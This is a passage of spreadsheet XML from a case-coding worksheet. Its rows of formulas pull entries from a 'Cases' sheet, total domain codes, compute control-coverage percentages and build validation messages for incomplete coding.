        <f>IF(AI53="","",IF(AI53=0,"No domain coded 1; ","")&amp;IF(M53="","Primary domain missing; ",IF(IFERROR(INDEX(E53:L53,1,M53),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N53:AG53)&lt;&gt;AJ53,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH53="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN53" s="13">
        <f>IF(AND(AI53&lt;&gt;"",AM53=""),1,0)</f>
        <v/>
      </c>
      <c r="AO53" s="14" t="n"/>
    </row>
    <row r="54">
      <c r="A54" s="11">
        <f>Cases!A54</f>
        <v/>
      </c>
      <c r="B54" s="11">
        <f>Cases!B54</f>
        <v/>
      </c>
      <c r="C54" s="11">
        <f>Cases!C54</f>
        <v/>
      </c>
      <c r="D54" s="11">
        <f>IF(Cases!F54="",LEFT(Cases!G54,120),Cases!F54)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E54:L54)=0,"",SUM(E54:L54))</f>
        <v/>
      </c>
      <c r="AJ54" s="13">
        <f>IF(AI54="","",N(E54)*3+N(F54)*2+N(G54)*2+N(H54)*2+N(I54)*2+N(J54)*3+N(K54)*3+N(L54)*3)</f>
        <v/>
      </c>
      <c r="AK54" s="13">
        <f>IF(AI54="","",COUNTIF(N54:AG54,1))</f>
        <v/>
      </c>
      <c r="AL54" s="13">
        <f>IF(OR(AJ54="",AJ54=0),"",ROUND(100*(AJ54-AK54)/AJ54,1))</f>
        <v/>
      </c>
      <c r="AM54" s="11">
        <f>IF(AI54="","",IF(AI54=0,"No domain coded 1; ","")&amp;IF(M54="","Primary domain missing; ",IF(IFERROR(INDEX(E54:L54,1,M54),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N54:AG54)&lt;&gt;AJ54,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH54="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN54" s="13">
        <f>IF(AND(AI54&lt;&gt;"",AM54=""),1,0)</f>
        <v/>
      </c>
      <c r="AO54" s="14" t="n"/>
    </row>
    <row r="55">
      <c r="A55" s="11">
        <f>Cases!A55</f>
        <v/>
      </c>
      <c r="B55" s="11">
        <f>Cases!B55</f>
        <v/>
      </c>
      <c r="C55" s="11">
        <f>Cases!C55</f>
        <v/>
      </c>
      <c r="D55" s="11">
        <f>IF(Cases!F55="",LEFT(Cases!G55,120),Cases!F55)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E55:L55)=0,"",SUM(E55:L55))</f>
        <v/>
      </c>
      <c r="AJ55" s="13">
        <f>IF(AI55="","",N(E55)*3+N(F55)*2+N(G55)*2+N(H55)*2+N(I55)*2+N(J55)*3+N(K55)*3+N(L55)*3)</f>
        <v/>
      </c>
      <c r="AK55" s="13">
        <f>IF(AI55="","",COUNTIF(N55:AG55,1))</f>
        <v/>
      </c>
      <c r="AL55" s="13">
        <f>IF(OR(AJ55="",AJ55=0),"",ROUND(100*(AJ55-AK55)/AJ55,1))</f>
        <v/>
      </c>
      <c r="AM55" s="11">
        <f>IF(AI55="","",IF(AI55=0,"No domain coded 1; ","")&amp;IF(M55="","Primary domain missing; ",IF(IFERROR(INDEX(E55:L55,1,M55),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N55:AG55)&lt;&gt;AJ55,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH55="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN55" s="13">
        <f>IF(AND(AI55&lt;&gt;"",AM55=""),1,0)</f>
        <v/>
      </c>
      <c r="AO55" s="14" t="n"/>
    </row>
    <row r="56">
      <c r="A56" s="11">
        <f>Cases!A56</f>
        <v/>
      </c>
      <c r="B56" s="11">
        <f>Cases!B56</f>
        <v/>
      </c>
      <c r="C56" s="11">
        <f>Cases!C56</f>
        <v/>
      </c>
      <c r="D56" s="11">
        <f>IF(Cases!F56="",LEFT(Cases!G56,120),Cases!F56)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E56:L56)=0,"",SUM(E56:L56))</f>
        <v/>
      </c>
      <c r="AJ56" s="13">
        <f>IF(AI56="","",N(E56)*3+N(F56)*2+N(G56)*2+N(H56)*2+N(I56)*2+N(J56)*3+N(K56)*3+N(L56)*3)</f>
        <v/>
      </c>
      <c r="AK56" s="13">
        <f>IF(AI56="","",COUNTIF(N56:AG56,1))</f>
        <v/>
      </c>
      <c r="AL56" s="13">
        <f>IF(OR(AJ56="",AJ56=0),"",ROUND(100*(AJ56-AK56)/AJ56,1))</f>
        <v/>
      </c>
      <c r="AM56" s="11">
        <f>IF(AI56="","",IF(AI56=0,"No domain coded 1; ","")&amp;IF(M56="","Primary domain missing; ",IF(IFERROR(INDEX(E56:L56,1,M56),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N56:AG56)&lt;&gt;AJ56,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH56="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN56" s="13">
        <f>IF(AND(AI56&lt;&gt;"",AM56=""),1,0)</f>
        <v/>
      </c>
      <c r="AO56" s="14" t="n"/>
    </row>
    <row r="57">
      <c r="A57" s="11">
        <f>Cases!A57</f>
        <v/>
      </c>
      <c r="B57" s="11">
        <f>Cases!B57</f>
        <v/>
      </c>
      <c r="C57" s="11">
        <f>Cases!C57</f>
        <v/>
      </c>
      <c r="D57" s="11">
        <f>IF(Cases!F57="",LEFT(Cases!G57,120),Cases!F57)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E57:L57)=0,"",SUM(E57:L57))</f>
        <v/>
      </c>
      <c r="AJ57" s="13">
        <f>IF(AI57="","",N(E57)*3+N(F57)*2+N(G57)*2+N(H57)*2+N(I57)*2+N(J57)*3+N(K57)*3+N(L57)*3)</f>
        <v/>
      </c>
      <c r="AK57" s="13">
        <f>IF(AI57="","",COUNTIF(N57:AG57,1))</f>
        <v/>
      </c>
      <c r="AL57" s="13">
        <f>IF(OR(AJ57="",AJ57=0),"",ROUND(100*(AJ57-AK57)/AJ57,1))</f>
        <v/>
      </c>
      <c r="AM57" s="11">
        <f>IF(AI57="","",IF(AI57=0,"No domain coded 1; ","")&amp;IF(M57="","Primary domain missing; ",IF(IFERROR(INDEX(E57:L57,1,M57),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N57:AG57)&lt;&gt;AJ57,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH57="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN57" s="13">
        <f>IF(AND(AI57&lt;&gt;"",AM57=""),1,0)</f>
        <v/>
      </c>
      <c r="AO57" s="14" t="n"/>
    </row>
    <row r="58">
      <c r="A58" s="11">
        <f>Cases!A58</f>
        <v/>
      </c>
      <c r="B58" s="11">
        <f>Cases!B58</f>
        <v/>
      </c>
      <c r="C58" s="11">
        <f>Cases!C58</f>
        <v/>
      </c>
      <c r="D58" s="11">
        <f>IF(Cases!F58="",LEFT(Cases!G58,120),Cases!F58)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E58:L58)=0,"",SUM(E58:L58))</f>
        <v/>
      </c>
      <c r="AJ58" s="13">
        <f>IF(AI58="","",N(E58)*3+N(F58)*2+N(G58)*2+N(H58)*2+N(I58)*2+N(J58)*3+N(K58)*3+N(L58)*3)</f>
        <v/>
      </c>
      <c r="AK58" s="13">
        <f>IF(AI58="","",COUNTIF(N58:AG58,1))</f>
        <v/>
      </c>
      <c r="AL58" s="13">
        <f>IF(OR(AJ58="",AJ58=0),"",ROUND(100*(AJ58-AK58)/AJ58,1))</f>
        <v/>
      </c>
      <c r="AM58" s="11">
        <f>IF(AI58="","",IF(AI58=0,"No domain coded 1; ","")&amp;IF(M58="","Primary domain missing; ",IF(IFERROR(INDEX(E58:L58,1,M58),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N58:AG58)&lt;&gt;AJ58,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH58="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN58" s="13">
        <f>IF(AND(AI58&lt;&gt;"",AM58=""),1,0)</f>
        <v/>
      </c>
      <c r="AO58" s="14" t="n"/>
    </row>
    <row r="59">
      <c r="A59" s="11">
        <f>Cases!A59</f>
        <v/>
      </c>
      <c r="B59" s="11">
        <f>Cases!B59</f>
        <v/>
      </c>
      <c r="C59" s="11">
        <f>Cases!C59</f>
        <v/>
      </c>
      <c r="D59" s="11">
        <f>IF(Cases!F59="",LEFT(Cases!G59,120),Cases!F59)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E59:L59)=0,"",SUM(E59:L59))</f>
        <v/>
      </c>
      <c r="AJ59" s="13">
        <f>IF(AI59="","",N(E59)*3+N(F59)*2+N(G59)*2+N(H59)*2+N(I59)*2+N(J59)*3+N(K59)*3+N(L59)*3)</f>
        <v/>
      </c>
      <c r="AK59" s="13">
        <f>IF(AI59="","",COUNTIF(N59:AG59,1))</f>
        <v/>
      </c>
      <c r="AL59" s="13">
        <f>IF(OR(AJ59="",AJ59=0),"",ROUND(100*(AJ59-AK59)/AJ59,1))</f>
        <v/>
      </c>
      <c r="AM59" s="11">
        <f>IF(AI59="","",IF(AI59=0,"No domain coded 1; ","")&amp;IF(M59="","Primary domain missing; ",IF(IFERROR(INDEX(E59:L59,1,M59),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N59:AG59)&lt;&gt;AJ59,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH59="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN59" s="13">
        <f>IF(AND(AI59&lt;&gt;"",AM59=""),1,0)</f>
        <v/>
      </c>
      <c r="AO59" s="14" t="n"/>
    </row>
    <row r="60">
      <c r="A60" s="11">
        <f>Cases!A60</f>
        <v/>
      </c>
      <c r="B60" s="11">
        <f>Cases!B60</f>
        <v/>
      </c>
      <c r="C60" s="11">
        <f>Cases!C60</f>
        <v/>
      </c>
      <c r="D60" s="11">
        <f>IF(Cases!F60="",LEFT(Cases!G60,120),Cases!F60)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E60:L60)=0,"",SUM(E60:L60))</f>
        <v/>
      </c>
      <c r="AJ60" s="13">
        <f>IF(AI60="","",N(E60)*3+N(F60)*2+N(G60)*2+N(H60)*2+N(I60)*2+N(J60)*3+N(K60)*3+N(L60)*3)</f>
        <v/>
      </c>
      <c r="AK60" s="13">
        <f>IF(AI60="","",COUNTIF(N60:AG60,1))</f>
        <v/>
      </c>
      <c r="AL60" s="13">
        <f>IF(OR(AJ60="",AJ60=0),"",ROUND(100*(AJ60-AK60)/AJ60,1))</f>
        <v/>
      </c>
      <c r="AM60" s="11">
        <f>IF(AI60="","",IF(AI60=0,"No domain coded 1; ","")&amp;IF(M60="","Primary domain missing; ",IF(IFERROR(INDEX(E60:L60,1,M60),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N60:AG60)&lt;&gt;AJ60,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH60="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN60" s="13">
        <f>IF(AND(AI60&lt;&gt;"",AM60=""),1,0)</f>
        <v/>
      </c>
      <c r="AO60" s="14" t="n"/>
    </row>
    <row r="61">
      <c r="A61" s="11">
        <f>Cases!A61</f>
        <v/>
      </c>
      <c r="B61" s="11">
        <f>Cases!B61</f>
        <v/>
      </c>
      <c r="C61" s="11">
        <f>Cases!C61</f>
        <v/>
      </c>
      <c r="D61" s="11">
        <f>IF(Cases!F61="",LEFT(Cases!G61,120),Cases!F61)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E61:L61)=0,"",SUM(E61:L61))</f>
        <v/>
      </c>
      <c r="AJ61" s="13">
        <f>IF(AI61="","",N(E61)*3+N(F61)*2+N(G61)*2+N(H61)*2+N(I61)*2+N(J61)*3+N(K61)*3+N(L61)*3)</f>
        <v/>
      </c>
      <c r="AK61" s="13">
        <f>IF(AI61="","",COUNTIF(N61:AG61,1))</f>
        <v/>
      </c>
      <c r="AL61" s="13">
        <f>IF(OR(AJ61="",AJ61=0),"",ROUND(100*(AJ61-AK61)/AJ61,1))</f>
        <v/>
      </c>
      <c r="AM61" s="11">
        <f>IF(AI61="","",IF(AI61=0,"No domain coded 1; ","")&amp;IF(M61="","Primary domain missing; ",IF(IFERROR(INDEX(E61:L61,1,M61),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N61:AG61)&lt;&gt;AJ61,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH61="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN61" s="13">
        <f>IF(AND(AI61&lt;&gt;"",AM61=""),1,0)</f>
        <v/>
      </c>
      <c r="AO61" s="14" t="n"/>
    </row>
    <row r="62">
      <c r="A62" s="11">
        <f>Cases!A62</f>
        <v/>
      </c>
      <c r="B62" s="11">
        <f>Cases!B62</f>
        <v/>
      </c>
      <c r="C62" s="11">
        <f>Cases!C62</f>
        <v/>
      </c>
      <c r="D62" s="11">
        <f>IF(Cases!F62="",LEFT(Cases!G62,120),Cases!F62)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E62:L62)=0,"",SUM(E62:L62))</f>
        <v/>
      </c>
      <c r="AJ62" s="13">
        <f>IF(AI62="","",N(E62)*3+N(F62)*2+N(G62)*2+N(H62)*2+N(I62)*2+N(J62)*3+N(K62)*3+N(L62)*3)</f>
        <v/>
      </c>
      <c r="AK62" s="13">
        <f>IF(AI62="","",COUNTIF(N62:AG62,1))</f>
        <v/>
      </c>
      <c r="AL62" s="13">
        <f>IF(OR(AJ62="",AJ62=0),"",ROUND(100*(AJ62-AK62)/AJ62,1))</f>
        <v/>
      </c>
      <c r="AM62" s="11">
        <f>IF(AI62="","",IF(AI62=0,"No domain coded 1; ","")&amp;IF(M62="","Primary domain missing; ",IF(IFERROR(INDEX(E62:L62,1,M62),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N62:AG62)&lt;&gt;AJ62,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH62="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN62" s="13">
        <f>IF(AND(AI62&lt;&gt;"",AM62=""),1,0)</f>
        <v/>
      </c>
      <c r="AO62" s="14" t="n"/>
    </row>
    <row r="63">
      <c r="A63" s="11">
        <f>Cases!A63</f>
        <v/>
      </c>
      <c r="B63" s="11">
        <f>Cases!B63</f>
        <v/>
      </c>
      <c r="C63" s="11">
        <f>Cases!C63</f>
        <v/>
      </c>
      <c r="D63" s="11">
        <f>IF(Cases!F63="",LEFT(Cases!G63,120),Cases!F63)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E63:L63)=0,"",SUM(E63:L63))</f>
        <v/>
      </c>
      <c r="AJ63" s="13">
        <f>IF(AI63="","",N(E63)*3+N(F63)*2+N(G63)*2+N(H63)*2+N(I63)*2+N(J63)*3+N(K63)*3+N(L63)*3)</f>
        <v/>
      </c>
      <c r="AK63" s="13">
        <f>IF(AI63="","",COUNTIF(N63:AG63,1))</f>
        <v/>
      </c>
      <c r="AL63" s="13">
        <f>IF(OR(AJ63="",AJ63=0),"",ROUND(100*(AJ63-AK63)/AJ63,1))</f>
        <v/>
      </c>
      <c r="AM63" s="11">
        <f>IF(AI63="","",IF(AI63=0,"No domain coded 1; ","")&amp;IF(M63="","Primary domain missing; ",IF(IFERROR(INDEX(E63:L63,1,M63),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N63:AG63)&lt;&gt;AJ63,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH63="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN63" s="13">
        <f>IF(AND(AI63&lt;&gt;"",AM63=""),1,0)</f>
        <v/>
      </c>
      <c r="AO63" s="14" t="n"/>
    </row>
    <row r="64">
      <c r="A64" s="11">
        <f>Cases!A64</f>
        <v/>
      </c>
      <c r="B64" s="11">
        <f>Cases!B64</f>
        <v/>
      </c>
      <c r="C64" s="11">
        <f>Cases!C64</f>
        <v/>
      </c>
      <c r="D64" s="11">
        <f>IF(Cases!F64="",LEFT(Cases!G64,120),Cases!F64)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E64:L64)=0,"",SUM(E64:L64))</f>
        <v/>
      </c>
      <c r="AJ64" s="13">
        <f>IF(AI64="","",N(E64)*3+N(F64)*2+N(G64)*2+N(H64)*2+N(I64)*2+N(J64)*3+N(K64)*3+N(L64)*3)</f>
        <v/>
      </c>
      <c r="AK64" s="13">
        <f>IF(AI64="","",COUNTIF(N64:AG64,1))</f>
        <v/>
      </c>
      <c r="AL64" s="13">
        <f>IF(OR(AJ64="",AJ64=0),"",ROUND(100*(AJ64-AK64)/AJ64,1))</f>
        <v/>
      </c>
      <c r="AM64" s="11">
        <f>IF(AI64="","",IF(AI64=0,"No domain coded 1; ","")&amp;IF(M64="","Primary domain missing; ",IF(IFERROR(INDEX(E64:L64,1,M64),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N64:AG64)&lt;&gt;AJ64,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH64="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN64" s="13">
        <f>IF(AND(AI64&lt;&gt;"",AM64=""),1,0)</f>
        <v/>
      </c>
      <c r="AO64" s="14" t="n"/>
    </row>
    <row r="65">
      <c r="A65" s="11">
        <f>Cases!A65</f>
        <v/>
      </c>
      <c r="B65" s="11">
        <f>Cases!B65</f>
        <v/>
      </c>
      <c r="C65" s="11">
        <f>Cases!C65</f>
        <v/>
      </c>
      <c r="D65" s="11">
        <f>IF(Cases!F65="",LEFT(Cases!G65,120),Cases!F65)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E65:L65)=0,"",SUM(E65:L65))</f>
        <v/>
      </c>
      <c r="AJ65" s="13">
        <f>IF(AI65="","",N(E65)*3+N(F65)*2+N(G65)*2+N(H65)*2+N(I65)*2+N(J65)*3+N(K65)*3+N(L65)*3)</f>
        <v/>
      </c>
      <c r="AK65" s="13">
        <f>IF(AI65="","",COUNTIF(N65:AG65,1))</f>
        <v/>
      </c>
      <c r="AL65" s="13">
        <f>IF(OR(AJ65="",AJ65=0),"",ROUND(100*(AJ65-AK65)/AJ65,1))</f>
        <v/>
      </c>
      <c r="AM65" s="11">
        <f>IF(AI65="","",IF(AI65=0,"No domain coded 1; ","")&amp;IF(M65="","Primary domain missing; ",IF(IFERROR(INDEX(E65:L65,1,M65),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N65:AG65)&lt;&gt;AJ65,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH65="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN65" s="13">
        <f>IF(AND(AI65&lt;&gt;"",AM65=""),1,0)</f>
        <v/>
      </c>
      <c r="AO65" s="14" t="n"/>
    </row>
    <row r="66">
      <c r="A66" s="11">
        <f>Cases!A66</f>
        <v/>
      </c>
      <c r="B66" s="11">
        <f>Cases!B66</f>
        <v/>
      </c>
      <c r="C66" s="11">
        <f>Cases!C66</f>
        <v/>
      </c>
      <c r="D66" s="11">
        <f>IF(Cases!F66="",LEFT(Cases!G66,120),Cases!F66)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI66" s="13">
        <f>IF(COUNT(E66:L66)=0,"",SUM(E66:L66))</f>
        <v/>
      </c>
      <c r="AJ66" s="13">
        <f>IF(AI66="","",N(E66)*3+N(F66)*2+N(G66)*2+N(H66)*2+N(I66)*2+N(J66)*3+N(K66)*3+N(L66)*3)</f>
        <v/>
      </c>
      <c r="AK66" s="13">
        <f>IF(AI66="","",COUNTIF(N66:AG66,1))</f>
        <v/>
      </c>
      <c r="AL66" s="13">
        <f>IF(OR(AJ66="",AJ66=0),"",ROUND(100*(AJ66-AK66)/AJ66,1))</f>
        <v/>
      </c>
      <c r="AM66" s="11">
        <f>IF(AI66="","",IF(AI66=0,"No domain coded 1; ","")&amp;IF(M66="","Primary domain missing; ",IF(IFERROR(INDEX(E66:L66,1,M66),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N66:AG66)&lt;&gt;AJ66,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH66="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN66" s="13">
        <f>IF(AND(AI66&lt;&gt;"",AM66=""),1,0)</f>
        <v/>
      </c>
      <c r="AO66" s="14" t="n"/>
    </row>
    <row r="67">
      <c r="A67" s="11">
        <f>Cases!A67</f>
        <v/>
      </c>
      <c r="B67" s="11">
        <f>Cases!B67</f>
        <v/>
      </c>
      <c r="C67" s="11">
        <f>Cases!C67</f>
        <v/>
      </c>
      <c r="D67" s="11">
        <f>IF(Cases!F67="",LEFT(Cases!G67,120),Cases!F67)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E67:L67)=0,"",SUM(E67:L67))</f>
        <v/>
      </c>
      <c r="AJ67" s="13">
        <f>IF(AI67="","",N(E67)*3+N(F67)*2+N(G67)*2+N(H67)*2+N(I67)*2+N(J67)*3+N(K67)*3+N(L67)*3)</f>
        <v/>
      </c>
      <c r="AK67" s="13">
        <f>IF(AI67="","",COUNTIF(N67:AG67,1))</f>
        <v/>
      </c>
      <c r="AL67" s="13">
        <f>IF(OR(AJ67="",AJ67=0),"",ROUND(100*(AJ67-AK67)/AJ67,1))</f>
        <v/>
      </c>
      <c r="AM67" s="11">
        <f>IF(AI67="","",IF(AI67=0,"No domain coded 1; ","")&amp;IF(M67="","Primary domain missing; ",IF(IFERROR(INDEX(E67:L67,1,M67),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N67:AG67)&lt;&gt;AJ67,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH67="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN67" s="13">
        <f>IF(AND(AI67&lt;&gt;"",AM67=""),1,0)</f>
        <v/>
      </c>
      <c r="AO67" s="14" t="n"/>
    </row>
    <row r="68">
      <c r="A68" s="11">
        <f>Cases!A68</f>
        <v/>
      </c>
      <c r="B68" s="11">
        <f>Cases!B68</f>
        <v/>
      </c>
      <c r="C68" s="11">
        <f>Cases!C68</f>
        <v/>
      </c>
      <c r="D68" s="11">
        <f>IF(Cases!F68="",LEFT(Cases!G68,120),Cases!F68)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI68" s="13">
        <f>IF(COUNT(E68:L68)=0,"",SUM(E68:L68))</f>
        <v/>
      </c>
      <c r="AJ68" s="13">
        <f>IF(AI68="","",N(E68)*3+N(F68)*2+N(G68)*2+N(H68)*2+N(I68)*2+N(J68)*3+N(K68)*3+N(L68)*3)</f>
        <v/>
      </c>
      <c r="AK68" s="13">
        <f>IF(AI68="","",COUNTIF(N68:AG68,1))</f>
        <v/>
      </c>
      <c r="AL68" s="13">
        <f>IF(OR(AJ68="",AJ68=0),"",ROUND(100*(AJ68-AK68)/AJ68,1))</f>
        <v/>
      </c>
      <c r="AM68" s="11">
        <f>IF(AI68="","",IF(AI68=0,"No domain coded 1; ","")&amp;IF(M68="","Primary domain missing; ",IF(IFERROR(INDEX(E68:L68,1,M68),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N68:AG68)&lt;&gt;AJ68,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH68="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN68" s="13">
        <f>IF(AND(AI68&lt;&gt;"",AM68=""),1,0)</f>
        <v/>
      </c>
      <c r="AO68" s="14" t="n"/>
    </row>
    <row r="69">
      <c r="A69" s="11">
        <f>Cases!A69</f>
        <v/>
      </c>
      <c r="B69" s="11">
        <f>Cases!B69</f>
        <v/>
      </c>
      <c r="C69" s="11">
        <f>Cases!C69</f>
        <v/>
      </c>
      <c r="D69" s="11">
        <f>IF(Cases!F69="",LEFT(Cases!G69,120),Cases!F69)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E69:L69)=0,"",SUM(E69:L69))</f>
        <v/>
      </c>
      <c r="AJ69" s="13">
        <f>IF(AI69="","",N(E69)*3+N(F69)*2+N(G69)*2+N(H69)*2+N(I69)*2+N(J69)*3+N(K69)*3+N(L69)*3)</f>
        <v/>
      </c>
      <c r="AK69" s="13">
        <f>IF(AI69="","",COUNTIF(N69:AG69,1))</f>
        <v/>
      </c>
      <c r="AL69" s="13">
        <f>IF(OR(AJ69="",AJ69=0),"",ROUND(100*(AJ69-AK69)/AJ69,1))</f>
        <v/>
      </c>
      <c r="AM69" s="11">
        <f>IF(AI69="","",IF(AI69=0,"No domain coded 1; ","")&amp;IF(M69="","Primary domain missing; ",IF(IFERROR(INDEX(E69:L69,1,M69),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N69:AG69)&lt;&gt;AJ69,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH69="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN69" s="13">
        <f>IF(AND(AI69&lt;&gt;"",AM69=""),1,0)</f>
        <v/>
      </c>
      <c r="AO69" s="14" t="n"/>
    </row>
    <row r="70">
      <c r="A70" s="11">
        <f>Cases!A70</f>
        <v/>
      </c>
      <c r="B70" s="11">
        <f>Cases!B70</f>
        <v/>
      </c>
      <c r="C70" s="11">
        <f>Cases!C70</f>
        <v/>
      </c>
      <c r="D70" s="11">
        <f>IF(Cases!F70="",LEFT(Cases!G70,120),Cases!F70)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E70:L70)=0,"",SUM(E70:L70))</f>
        <v/>
      </c>
      <c r="AJ70" s="13">
        <f>IF(AI70="","",N(E70)*3+N(F70)*2+N(G70)*2+N(H70)*2+N(I70)*2+N(J70)*3+N(K70)*3+N(L70)*3)</f>
        <v/>
      </c>
      <c r="AK70" s="13">
        <f>IF(AI70="","",COUNTIF(N70:AG70,1))</f>
        <v/>
      </c>
      <c r="AL70" s="13">
        <f>IF(OR(AJ70="",AJ70=0),"",ROUND(100*(AJ70-AK70)/AJ70,1))</f>
        <v/>
      </c>
      <c r="AM70" s="11">
        <f>IF(AI70="","",IF(AI70=0,"No domain coded 1; ","")&amp;IF(M70="","Primary domain missing; ",IF(IFERROR(INDEX(E70:L70,1,M70),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N70:AG70)&lt;&gt;AJ70,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH70="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN70" s="13">
        <f>IF(AND(AI70&lt;&gt;"",AM70=""),1,0)</f>
        <v/>
      </c>
      <c r="AO70" s="14" t="n"/>
    </row>
    <row r="71">
      <c r="A71" s="11">
        <f>Cases!A71</f>
        <v/>
      </c>
      <c r="B71" s="11">
        <f>Cases!B71</f>
        <v/>
      </c>
      <c r="C71" s="11">
        <f>Cases!C71</f>
        <v/>
      </c>
      <c r="D71" s="11">
        <f>IF(Cases!F71="",LEFT(Cases!G71,120),Cases!F71)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E71:L71)=0,"",SUM(E71:L71))</f>
        <v/>
      </c>
      <c r="AJ71" s="13">
        <f>IF(AI71="","",N(E71)*3+N(F71)*2+N(G71)*2+N(H71)*2+N(I71)*2+N(J71)*3+N(K71)*3+N(L71)*3)</f>
        <v/>
      </c>
      <c r="AK71" s="13">
        <f>IF(AI71="","",COUNTIF(N71:AG71,1))</f>
        <v/>
      </c>
      <c r="AL71" s="13">
        <f>IF(OR(AJ71="",AJ71=0),"",ROUND(100*(AJ71-AK71)/AJ71,1))</f>
        <v/>
      </c>
      <c r="AM71" s="11">
        <f>IF(AI71="","",IF(AI71=0,"No domain coded 1; ","")&amp;IF(M71="","Primary domain missing; ",IF(IFERROR(INDEX(E71:L71,1,M71),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N71:AG71)&lt;&gt;AJ71,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH71="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN71" s="13">
        <f>IF(AND(AI71&lt;&gt;"",AM71=""),1,0)</f>
        <v/>
      </c>
      <c r="AO71" s="14" t="n"/>
    </row>
    <row r="72">
      <c r="A72" s="11">
        <f>Cases!A72</f>
        <v/>
      </c>
      <c r="B72" s="11">
        <f>Cases!B72</f>
        <v/>
      </c>
      <c r="C72" s="11">
        <f>Cases!C72</f>
        <v/>
      </c>
      <c r="D72" s="11">
        <f>IF(Cases!F72="",LEFT(Cases!G72,120),Cases!F72)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E72:L72)=0,"",SUM(E72:L72))</f>
        <v/>
      </c>
      <c r="AJ72" s="13">
        <f>IF(AI72="","",N(E72)*3+N(F72)*2+N(G72)*2+N(H72)*2+N(I72)*2+N(J72)*3+N(K72)*3+N(L72)*3)</f>
        <v/>
      </c>
